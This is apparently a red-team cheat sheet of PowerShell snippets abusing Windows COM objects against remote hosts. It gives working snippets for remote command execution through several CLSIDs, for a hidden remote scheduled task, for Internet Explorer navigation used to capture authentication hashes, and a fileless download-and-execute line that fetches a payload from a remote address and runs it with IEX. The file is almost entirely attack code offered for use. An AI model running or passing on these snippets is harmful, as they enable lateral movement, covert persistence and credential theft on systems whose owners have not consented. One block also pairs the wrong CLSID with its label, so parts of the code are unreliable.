# COM abuse

List of COM objects that can be used to execute command remotely, download file and capture hash

# Command Execution

```
COM Object - E430E93D-09A9-4DC5-80E3-CBB2FB9AF28E - ProcessChain Class
$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID("E430E93D-09A9-4DC5-80E3-CBB2FB9AF28E"), "ip")
$handle.ExecutablePath = "C:\windows\system32\cmd.exe"
$handle.CommandLine = "/c whoami"
$handle.Start([ref]$True)
```

```
COM Object - F935DC22-1CF0-11D0-ADB9-00C04FD58A0B - Windows Script Host Shell Object
$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID("F935DC22-1CF0-11D0-ADB9-00C04FD58A0B", "ip")
$handle.Run("C:\windows\system32\cmd.exe")
```

```
COM Object - F935DC22-1CF0-11D0-ADB9-00C04FD58A0B - Windows Script Host Shell Object
$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID("F935DC22-1CF0-11D0-ADB9-00C04FD58A0B", "ip")
$handle.Exec("C:\windows\system32\cmd.exe")
```

```
COM Object - C08AFD90-F2A1-11D1-8455-00A0C91F3880 - ShellBrowserWindow

$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID("F935DC22-1CF0-11D0-ADB9-00C04FD58A0B", "ip")
$handle.Navigate("C:\windows\system32\cmd.exe")
```

# Remote Task Schedule 

```
$o = [activator]::CreateInstance([type]::GetTypeFromProgID("Schedule.Service"), "ip")
$o.Connect()
$f = $o.GetFolder("\")
$t = $o.NewTask(0)
$s = $t.Settings
$s.Hidden = $True
$a = $t.Actions.Create(0)
$a.Path = "C:\windows\system32\cmd.exe"
$a.Arguments = "/c whoami"
$a.HideAppWindow = $True
$f.RegisterTaskDefinition("a", $t, 6, "", "", 3)
```

# Query Remote Website (support auth hash capture)

```
$o = [activator]::CreateInstance([type]::GetTypeFromProgID("InternetExplorer.Application"), "ip")
$data = $o.Navigate("http://google.ca", 0, "_self", 0,0)
```

# Alternative to DownloadString fileless download

```
$o = [activator]::CreateInstance([type]::GetTypeFromCLSID("F5078F35-C551-11D3-89B9-0000F81FE221")); $o.Open("GET", "http://127.0.0.1:8000/payload", $False); $o.Send(); IEX $o.responseText;
```
